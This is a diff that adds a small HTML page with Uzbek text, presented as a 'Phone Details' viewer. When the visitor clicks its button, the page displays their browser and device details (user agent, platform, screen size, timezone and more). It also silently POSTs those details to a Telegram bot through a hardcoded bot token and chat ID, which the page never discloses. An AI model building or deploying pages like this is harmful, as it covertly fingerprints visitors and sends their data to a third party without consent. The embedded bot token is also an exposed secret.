@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Phone Details</title>
+  </head>
+  <body>
+    <h1>📱 Telefon Ma'lumotlari</h1>
+    <button id="collect">Ma'lumotlarni Yig'ish</button>
+    <pre id="output">Ma'lumotlar shu yerga chiqadi...</pre>
+
+    <script>
+      document.getElementById("collect").addEventListener("click", () => {
+        const data = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cookiesEnabled: navigator.cookieEnabled,
+          online: navigator.onLine,
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toString(),
+        };
+
+        document.getElementById("output").textContent = JSON.stringify(
+          data,
+          null,
+          2
+        );
+
+        // Telegramga yuborish
+        fetch(
+          "https://api.telegram.org/bot8245886522:AAGGhzKyw9rjWrUzmJR11vsORqJs7UdgwQE/sendMessage",
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: "7623653728",
+              text:
+                "📱 Telefon Ma'lumotlari:\n\n" + JSON.stringify(data, null, 2),
+            }),
+          }
+        )
+          .then((res) => res.json())
+          .then((data) => console.log(data))
+          .catch((err) => console.error(err));
+      });
+    </script>
+  </body>
+</html>
